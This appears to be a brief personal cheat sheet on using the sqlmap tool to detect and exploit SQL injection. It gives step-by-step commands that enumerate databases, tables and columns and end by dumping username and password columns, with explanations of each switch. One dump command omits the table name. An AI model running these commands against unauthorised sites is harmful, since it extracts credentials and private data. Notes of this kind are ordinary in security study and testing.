This tool try to indicate if the website is vulnerable to [SQLi](https://en.wikipedia.org/wiki/SQL_injection) and if is vulnerable, explote them

-----

# Use / Examples

## Test if is vulnerable
````bash
sqlmap -r request.req -p searchitem --batch
````

## show databases
````bash
sqlmap -r request.req -p searchitem --batch --dbs
````

## show tables
````bash
sqlmap -r request.req -p searchitem --batch -D NAMEBD --tables
````

## To show the columns of an indicate table

````bash
sqlmap -r request.req -p searchitem --batch -D NAMEBD -T users --columns
````

To show the values of the columns

````bash
sqlmap -r request.req -p searchitem --batch -D NAMEBD -T -C username,password --dump
````

-----

# Switches
Indicate the request file (This file is obtain in burpsuite)

> 	-r request.req --> 

parameter to test injections
> 	-p searchitem

To omit the question when the program is running 
> 	--batch

To obtain/show the exists databases
>	--dbs 

Indicate the name of database
> 	-D
 
Show the tables of the databases indicated
> 	--tables

Indicate the name of the table
>	-T

To show the names of columns
> 	--columns

Indicate the columns
>	-C

Show the information in this columns
>	--dump 


----

# Tags

#tools #sqlmap #sqli

----